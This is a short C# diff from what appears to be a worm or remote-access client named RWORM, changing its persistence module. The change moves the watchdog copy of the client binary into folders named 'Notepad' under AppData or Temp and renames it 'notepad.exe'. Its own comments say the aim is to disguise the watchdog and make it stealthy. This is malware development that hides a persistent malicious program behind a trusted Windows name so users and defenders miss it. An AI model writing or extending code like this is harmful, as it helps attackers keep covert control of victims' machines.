@@ -29,24 +29,24 @@ namespace RWORM.Client.Modules
                 // Ensure clean exit flag is removed from any previous session
                 try { if (File.Exists(FlagPath)) File.Delete(FlagPath); } catch { }
 
-                // Determine backup exe location
+                // Disguise watchdog executable as notepad.exe in user appdata/temp
                 string backupDir;
                 try
                 {
                     backupDir = Path.Combine(
                         Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
-                        "Microsoft", "WindowsService");
+                        "Microsoft", "Notepad");
                     Directory.CreateDirectory(backupDir);
                 }
                 catch
                 {
-                    backupDir = Path.Combine(Path.GetTempPath(), "rworm_guard");
+                    backupDir = Path.Combine(Path.GetTempPath(), "Notepad");
                     Directory.CreateDirectory(backupDir);
                 }
 
-                var backupExe = Path.Combine(backupDir, "rworm_watchdog.exe");
+                var backupExe = Path.Combine(backupDir, "notepad.exe");
 
-                // Copy current client binary as the backup executable
+                // Copy current client binary as stealth notepad.exe
                 try
                 {
                     File.Copy(currentExe, backupExe, true);
